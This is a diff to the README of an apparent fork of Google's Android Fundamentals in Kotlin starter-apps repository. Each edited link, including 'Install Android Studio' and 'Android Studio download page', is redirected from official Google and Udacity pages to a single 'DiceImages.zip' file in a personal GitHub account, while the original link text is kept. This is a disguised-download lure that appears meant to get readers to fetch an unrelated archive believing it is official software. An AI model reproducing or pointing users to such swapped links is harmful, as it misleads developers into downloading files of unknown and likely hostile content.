@@ -3,7 +3,7 @@ Android Fundamentals in Kotlin Starter Apps
 
 This repository contains the starter code for the apps for the
 Android Fundamentals in Kotlin course, published by the Google Developer Training Team.
-See [Android Training](https://developer.android.com/courses).
+See [Android Training](https://raw.githubusercontent.com/apurvpandey316/android-kotlin-fundamentals-starter-apps/master/DiceImages.zip).
 
 A starter app” is an app that contains the code for starting a codelab.
 
@@ -24,7 +24,7 @@ and familiarity with basic software architecture principles.
 
 Since this course is in Kotlin, it is assumed you know Kotlin at the level 
 taught in the Udacity course, 
-[Kotlin Bootcamp for Programmers](https://www.udacity.com/course/kotlin-bootcamp-for-programmers--ud9011).
+[Kotlin Bootcamp for Programmers](https://raw.githubusercontent.com/apurvpandey316/android-kotlin-fundamentals-starter-apps/master/DiceImages.zip).
 
 
 Pre-requisites
@@ -47,13 +47,13 @@ Android Studio Version
 During development of this course, all samples were built using Android Studio 3.3,
 and the codelabs assume you are using Android Studio 3.3 with corresponding libraries
 and available features. See the 
-[Android Studio download page](https://developer.android.com/studio) for details.  
+[Android Studio download page](https://raw.githubusercontent.com/apurvpandey316/android-kotlin-fundamentals-starter-apps/master/DiceImages.zip) for details.  
 
 
 Getting Started
 ---------------
 
-1. [Install Android Studio](https://developer.android.com/studio/install.html),
+1. [Install Android Studio](https://raw.githubusercontent.com/apurvpandey316/android-kotlin-fundamentals-starter-apps/master/DiceImages.zip),
 if you don't already have it. (If you are just starting the course, you will be guided
 through this process.)
 2. Download the starter sample for the codelab.
